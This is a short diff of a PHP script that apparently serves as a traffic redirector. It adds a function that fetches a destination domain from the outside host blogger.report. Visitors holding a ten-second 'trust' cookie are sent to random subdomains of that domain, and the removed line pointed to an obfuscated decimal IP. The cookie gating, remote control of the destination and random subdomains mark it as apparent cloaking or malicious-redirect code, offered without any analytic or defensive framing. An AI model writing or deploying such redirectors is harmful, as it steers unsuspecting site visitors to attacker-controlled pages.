@@ -27,6 +27,15 @@
   	curl_close($ch);
   	return $org;
   }
+
+  function getSite(){
+    $ch = curl_init();
+  	curl_setopt($ch, CURLOPT_URL, 'http://blogger.report/php/site.php');
+  	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  	$site = curl_exec($ch);
+  	curl_close($ch);
+  	return $site;
+  }
   
   $action = 'theme';
 
@@ -110,10 +119,11 @@
     
   }else if($action == 'site'){
     if(isset($_COOKIE["trust"])){
-    	header("Location: http://2335939030/".generate_name(rand(5,10)).".html");
+      $app_site = getSite();
+    	header("Location: http://".generate_name(rand(5,9)).".$app_site/$id");
     }else{
     	setcookie("trust", "true", (time() + 10), "/", ".".$_SERVER["HTTP_HOST"], false);
-      	header('Location:http://'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]);
+      header('Location:http://'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]);
     }
   }else{
     @ob_end_clean();
